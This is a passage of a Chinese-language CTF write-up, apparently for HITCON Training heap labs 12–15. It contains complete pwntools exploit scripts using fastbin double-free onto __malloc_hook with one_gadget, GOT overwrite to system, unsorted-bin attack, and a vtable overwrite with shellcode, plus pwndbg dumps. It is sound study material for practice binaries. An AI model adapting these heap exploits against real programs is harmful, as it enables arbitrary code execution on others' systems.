- 但比较的时候是先以fastbin中第一个size取得fastbin的index，再去用这个index跟刚刚算的index是否相同，不过这里取index的方式是用unsigned int(4 byte)，所以伪造时不用满足8 byte  
- 因为没有检查alignment所以不一定要以8的倍数作为chunk的address  
  
```python  
#coding=utf-8  
  
from pwn import *  
  
context.log_level = "debug"  
context.terminal = ["tmux", "split", "-h"]  
  
r = process("./secretgarden")  
  
def raiseFlower(size, name, color):  
	r.recvuntil("Your choice : ")  
	r.sendline("1")  
	r.recvuntil(":")  
	r.sendline(str(size))  
	r.recvuntil(":")  
	r.sendline(name)  
	r.recvuntil(":")  
	r.sendline(color)  
  
def removeFlower(idx):  
	r.recvuntil("Your choice : ")  
	r.sendline("3")  
	r.recvuntil(":")  
	r.sendline(str(idx))  
  
raiseFlower(0x50, "aaa", "blue")  
raiseFlower(0x50, "bbb", "red")  
  
removeFlower(0)  
removeFlower(1)  
removeFlower(0)  
  
fakechunk = 0x601ffa  
raiseFlower(0x50, p64(fakechunk), "red")  
raiseFlower(0x50, "aaa", "blue")  
raiseFlower(0x50, "bbb", "blue")  
magic = 0x400c7b  
payload = 'a'*6 + p64(0) + p64(magic) + p64(magic)  
raiseFlower(0x50, payload, "xxx")  
r.interactive()  
```  
  
```shell  
pwndbg> heapinfo  
(0x20)     fastbin[0]: 0x0  
(0x30)     fastbin[1]: 0x0  
(0x40)     fastbin[2]: 0x0  
(0x50)     fastbin[3]: 0x0  
(0x60)     fastbin[4]: 0x9e40d0 --> 0x9e4040 --> 0x601ffa (size error (0x168000000000060)) --> 0xf1000007f8c1ec3 (invaild memory)  
(0x70)     fastbin[5]: 0x0  
(0x80)     fastbin[6]: 0x0  
(0x90)     fastbin[7]: 0x0  
(0xa0)     fastbin[8]: 0x0  
(0xb0)     fastbin[9]: 0x0  
                  top: 0x9e4160 (size : 0x1fea0)  
       last_remainder: 0x0 (size : 0x0)  
            unsortbin: 0x  
  
pwndbg> x/30gx 0x601ff8  
0x601ff8:       0x0000000000000000      0x0000000000601e28  
0x602008:       0x00007f8c1ec30168      0x00007f8c1ea20f10  
0x602018:       0x00007f8c1e6c3540      0x00007f8c1e6ae6a0  
0x602028:       0x00000000004007b6      0x00007f8c1e694810  
0x602038:       0x00007f8c1e7b1a30      0x00007f8c1e70b280  
0x602048:       0x00007f8c1e7369a0      0x00007f8c1e736310  
0x602058:       0x00007f8c1e65f750      0x00007f8c1e6743d0  
0x602068:       0x00007f8c1e6c3180      0x00007f8c1e6aee80  
0x602078:       0x00007f8c1e7360f0      0x00007f8c1e675e90  
0x602088:       0x00007f8c1e6aa4e0      0x0000000000400886  
0x602098:       0x0000000000000000      0x0000000000000000  
0x6020a8:       0x0000000000000000      0x0000000000000000  
0x6020b8:       0x0000000000000000      0x00007f8c1ea04620  
0x6020c8 <completed>:   0x0000000300000000      0x0000000000000000  
0x6020d8:       0x0000000000000000      0x00000000009e3010  
  
pwndbg> x/30gx 0x601ffa  
0x601ffa:       0x1e28000000000000      0x0168000000000060  
0x60200a:       0x0f1000007f8c1ec3      0x354000007f8c1ea2  
0x60201a:       0xe6a000007f8c1e6c      0x07b600007f8c1e6a  
0x60202a:       0x4810000000000040      0x1a3000007f8c1e69  
0x60203a:       0xb28000007f8c1e7b      0x69a000007f8c1e70  
0x60204a:       0x631000007f8c1e73      0xf75000007f8c1e73  
0x60205a:       0x43d000007f8c1e65      0x318000007f8c1e67  
0x60206a:       0xee8000007f8c1e6c      0x60f000007f8c1e6a  
0x60207a:       0x5e9000007f8c1e73      0xa4e000007f8c1e67  
0x60208a:       0x088600007f8c1e6a      0x0000000000000040  
0x60209a:       0x0000000000000000      0x0000000000000000  
0x6020aa:       0x0000000000000000      0x0000000000000000  
0x6020ba:       0x4620000000000000      0x000000007f8c1ea0  
0x6020ca:       0x0000000000030000      0x0000000000000000  
0x6020da:       0x3010000000000000      0x40b000000000009e  
```  
  
在0x601ffa中只会检查最后四字节，会通过大小的检查。  
  
还可以通过UAF泄露unsortbin的地址， linux中使用free()进行内存释放时，不大于 max_fast （默认值为 64B）的 chunk 被释放后，首先会被放到 fast bins中，大于max_fast的chunk或者fast bins 中的空闲 chunk 合并后会被放入unsorted bin中（参考glibc内存管理ptmalloc源码分析一文）  
  
​    而在fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出main_arena的实际地址，结合偏移值从而得到libc的加载地址。  
  
- 首先通过unsorted_bin，free掉一个chunk，让它进入unsorted_bin表，使得fd指向表头，然后通过泄漏出的地址，通过一顿偏移的操作，泄漏出malloc_hook的地址，进而泄漏出libc的基址  
- 利用double-free，使得下一个新创建的chunk会落在malloc_hook上，进而改了malloc_hook的地址，改变程序执行流程  
  
借助one_gadget  
  
```python  
"""  
# one_gadget /lib/x86_64-linux-gnu/libc.so.6  
0x45226 execve("/bin/sh", rsp+0x30, environ)  
constraints:  
  rax == NULL  
  
0x4527a execve("/bin/sh", rsp+0x30, environ)  
constraints:  
  [rsp+0x30] == NULL  
  
0xf0364 execve("/bin/sh", rsp+0x50, environ)  
constraints:  
  [rsp+0x50] == NULL  
  
0xf1207 execve("/bin/sh", rsp+0x70, environ)  
constraints:  
  [rsp+0x70] == NULL  
"""  
#encoding:utf-8  
from pwn import *  
context(os="linux", arch="amd64",log_level = "debug")  
context.terminal = ["tmux", "split", "-h"]  
p = process("./secretgarden")#, aslr=0  
  
elf = ELF("./secretgarden")  
#libc = ELF("./libc-2.23.so")  
libc = elf.libc  
#-------------------------------------
def sl(s):  
    p.sendline(s)  
def sd(s):  
    p.send(s)  
def rc(timeout=0):  
    if timeout == 0:  
        return p.recv()  
    else:  
        return p.recv(timeout=timeout)  
def ru(s, timeout=0):  
    if timeout == 0:  
        return p.recvuntil(s)  
    else:  
        return p.recvuntil(s, timeout=timeout)  
def debug(msg=''):  
    gdb.attach(p,'')  
    pause()  
def getshell():  
    p.interactive()  
#-------------------------------------
def create(size,name,color):  
    ru("Your choice : ")  
    sl("1")  
    ru("Length of the name :")  
    sl(str(size))  
    ru("The name of flower :")  
    sd(name)  
    ru("The color of the flower :")  
    sl(color)  
  
def visit():  
    ru("Your choice : ")  
    sl("2")  
  
def remote(index):  
    ru("Your choice : ")  
    sl("3")  
    ru("Which flower do you want to remove from the garden:")  
    sl(str(index))  
  
def clean():  
    ru("Your choice : ")  
    sl("4")  
create(0x98,"a"*8,"1234")  
create(0x68,"b"*8,"b"*8)  
create(0x68,"b"*8,"b"*8)  
create(0x20,"b"*8,"b"*8)  
remote(0)  
clean()  
create(0x98,"c"*8,"c"*8)  
visit()  
ru("c"*8)  
leak = u64(p.recv(6).ljust(8,"\x00"))  
libc_base = leak -0x58-0x10 -libc.symbols["__malloc_hook"]  
print "leak----->"+hex(leak)  
malloc_hook = libc_base +libc.symbols["__malloc_hook"]  
print "malloc_hook----->"+hex(malloc_hook)  
print "libc_base----->"+hex(libc_base)  
one_gadget = 0xf02a4 + libc_base  
  
  
remote(1)  
remote(2)  
remote(1)  
#debug()  
create(0x68,p64(malloc_hook-0x23),"b"*4)  
create(0x68,"b"*8,"b"*8)  
create(0x68,"b"*8,"b"*8)  
  
create(0x68,"a"*0x13+p64(one_gadget),"b"*4)  
  
remote(1)  
remote(1)  
getshell()  
```  
  
如果由于堆栈原因one_gadget不可用:  
  
```python  
#encoding:utf-8  
from pwn import *  
# context(os="linux", arch="amd64",log_level = "debug")  
  
#-------------------------------------
def sl(s):  
    p.sendline(s)  
def sd(s):  
    p.send(s)  
def rc(timeout=0):  
    if timeout == 0:  
        return p.recv()  
    else:  
        return p.recv(timeout=timeout)  
def ru(s, timeout=0):  
    if timeout == 0:  
        return p.recvuntil(s)  
    else:  
        return p.recvuntil(s, timeout=timeout)  
def debug(msg=''):  
    gdb.attach(p,'')  
    pause()  
def getshell():  
    p.interactive()  
#-------------------------------------
def create(size,name,color):  
    ru("Your choice : ")  
    sl("1")  
    ru("Length of the name :")  
    sl(str(size))  
    ru("The name of flower :")  
    sd(name)  
    ru("The color of the flower :")  
    sl(color)  
  
def visit():  
    ru("Your choice : ")  
    sl("2")  
  
def remote(index):  
    ru("Your choice : ")  
    sl("3")  
    ru("Which flower do you want to remove from the garden:")  
    sl(str(index))  
  
def clean():  
    ru("Your choice : ")  
    sl("4")  
  
  
offset = 0  
while offset < 0x20:  
    try:  
        p = process("./secretgarden")#, aslr=0  
        elf = ELF("./secretgarden")  
        #libc = ELF("./libc-2.23.so")  
        libc = elf.libc  
        create(0x98,"a"*8,"1234")  
        create(0x68,"b"*8,"b"*8)  
        create(0x68,"b"*8,"b"*8)  
        create(0x20,"b"*8,"b"*8)  
        remote(0)  
        clean()  
        create(0x98,"c"*8,"c"*8)  
        visit()  
  
        ru("c"*8)  
        leak = u64(p.recv(6).ljust(8,"\x00"))  
        libc_base = leak -0x58-0x10 -libc.symbols["__malloc_hook"]  
        print "leak----->"+hex(leak)  
        malloc_hook = libc_base +libc.symbols["__malloc_hook"]  
        realloc = libc_base + libc.symbols['__libc_realloc']  
        print "malloc_hook----->"+hex(malloc_hook)  
        print "libc_base----->"+hex(libc_base)  
        # 0x45226  
        # 0x4527a  
        # 0xf0364  
        # 0xf1207  
        one_gadget = 0xf1207 + libc_base  
  
  
        remote(1)  
        remote(2)  
        remote(1)  
        #debug()  
        create(0x68,p64(malloc_hook-0x23),"b"*4)  
        create(0x68,"b"*8,"b"*8)  
        create(0x68,"b"*8,"b"*8)  
  
        create(0x68,"a"*(0x13-0x8)+p64(one_gadget)+p64(realloc + offset),"b"*4)  
        ru("Your choice : ")  
        sl("1")  
        sleep(0.1)  
        p.interactive()  
        offset += 1  
    except:  
        p.close()  
```  
  
## lab13  
  
off-by-one，可以覆盖下一次chunk的size  
  
- create两个chunk，用chunk0溢出到chunk1 的size位，然后free掉chunk1  
- 申请一个新的chunk2，使得chunk2落在chunk1size的部分从而修改指针  
- 改free的got表为system的地址，然后使得chunk0 的内容为/bin/sh，接着free（chunk0）从而getshell  
  
```python  
#coding=utf-8  
  
from pwn import *  
  
#context.log_level = "debug"  
  
r = process("./heapcreator")  
elf = ELF("./heapcreator")  
libc = elf.libc  
  
def createHeap(size, content):  
    r.recvuntil(":")  
    r.sendline("1")  
    r.recvuntil(":")  
    r.sendline(str(size))  
    r.recvuntil(":")  
    r.sendline(content)  
  
def editHeap(idx, content):  
    r.recvuntil(":")  
    r.sendline("2")  
    r.recvuntil(":")  
    r.sendline(str(idx))  
    r.recvuntil(":")  
    r.sendline(content)  
  
def deleteHeap(idx):  
    r.recvuntil(":")  
    r.sendline("4")  
    r.recvuntil(":")  
    r.sendline(str(idx))  
  
def showHeap(idx):  
    r.recvuntil(":")  
    r.sendline("3")  
    r.recvuntil(":")  
    r.sendline(str(idx))  
  
createHeap(0x18, "aaa")  
createHeap(0x10, "bbb")  
  
editHeap(0, "/bin/sh\x00" + "a"*0x10 + p64(0x41))  
deleteHeap(1)  
  
free_got = 0x602018  
off_free = 0x3e3ec0  
off_system = 0x453a0  
createHeap(0x30, "a"*24 + p64(21) + p64(0x30) + p64(free_got))  
showHeap(1)  
  
r.recvuntil("Content : ")  
free = u64(r.recv(6).ljust(8, "\x00"))  
success("free address " + hex(free))  
  
libc_base = free - libc.symbols["free"]  
success("libc_base: " + hex(libc_base))  
  
system = libc_base + libc.symbols["system"]  
success("system: " + hex(system))  
editHeap(1, p64(system))  
  
deleteHeap(0)  
  
r.interactive()  
```  
  
## lab14  
  
利用unsortbin的bk  
  
首先，释放一个chunk到 unsorted bin 中。  
接着利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &magic-16，再一次分配chunk的时候就会触发漏洞，会把magic的值改成一个大的数值  
  
对于unsort bin来说，下一次malloc时会先看unsort bin中是否有适合的chunk，找不到的话才会去对应的bin中寻找，此时会顺便把unsort bin的chunk放到对应的bin中。所以无论malloc的大小(大于144)，unsort bin都会有unlink操作。  
  
```python  
#coding=utf-8  
  
from pwn import *  
  
r = process("./magicheap")  
  
def createHeap(size, content):  
    r.recvuntil(":")  
    r.sendline("1")  
    r.recvuntil(":")  
    r.sendline(str(size))  
    r.recvuntil(":")  
    r.sendline(content)  
  
def editHeap(idx, size, content):  
    r.recvuntil(":")  
    r.sendline("2")  
    r.recvuntil(":")  
    r.sendline(str(idx))  
    r.recvuntil(":")  
    r.sendline(str(size))  
    r.recvuntil(":")  
    r.sendline(content)  
  
def delete(idx):  
    r.recvuntil(":")  
    r.sendline("3")  
    r.recvuntil(":")  
    r.sendline(str(idx))  
  
createHeap(0x30, "aaa")  
createHeap(0x80, "bbb")  
createHeap(0x30, "ccc")  
delete(1)  
magic = 0x6020C0  
editHeap(0, 0x100, "a"*0x30 + p64(0) + p64(0x91) + p64(0) + p64(magic - 0x10))  
createHeap(0x80, "bbb")  
r.interactive()  
```  
  
## lab15  
  
animallist中存储的数据结构:  
  
```c  
struct{  
    void *animal_vptr;  
    char name[24];  
    int weight;  
}  
```  
  
在Dog的构造函数中存在overflow，可以覆盖虚表指针  
  
- 首先new 两个dog，然后earse 0, 再次new，这样会把之前earse的空间分配给这一次。利用overflow可以覆盖上一个的虚表指针。  
  
```python  
#encoding:utf-8  
from pwn import *  
context(os="linux", arch="amd64",log_level = "debug")  
  
p = process("./zoo")#, aslr=0  
  
elf = ELF("./zoo")  
libc = elf.libc  
#-------------------------------------
def sl(s):  
    p.sendline(s)  
def sd(s):  
    p.send(s)  
def rc(timeout=0):  
    if timeout == 0:  
        return p.recv()  
    else:  
        return p.recv(timeout=timeout)  
def ru(s, timeout=0):  
    if timeout == 0:  
        return p.recvuntil(s)  
    else:  
        return p.recvuntil(s, timeout=timeout)  
def debug(msg=''):  
    gdb.attach(p,'')  
    pause()  
def getshell():  
    p.interactive()  
#-------------------------------------
  
shellcode = asm(shellcraft.sh())  
  
def add_dog(name,weight):  
    ru(":")  
    sl("1")  
    ru(":")  
    sl(name)  
    ru(":")  
    sl(str(weight))  
  
def remove(idx):  
    ru(":")  
    sl("5")  
    ru(":")  
    sl(str(idx))  
  
def listen(idx):  
    ru(":")  
    sl("3")  
    ru(":")  
    sl(str(idx))      
  
#gdb.attach(p,"b *0x40193E\nc\n")  
nameofzoo = 0x605420  
  
ru(":")  
sl(shellcode + p64(nameofzoo))  
  
add_dog("a"*8,0)  
add_dog("b"*8,1)  
  
remove(0)  
fake_vptr = nameofzoo + len(shellcode)  
add_dog("c"*72 + p64(fake_vptr),2)  
#pause()  
listen(0)  
getshell()  
```  
  
## 参考链接  
https://xz.aliyun.com/t/3902    
https://www.sec4.fun/2020/07/15/hitcon-training-writeup    
https://www.anquanke.com/post/id/186447    
https://introspelliam.github.io/2017/08/07/int-80h%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/  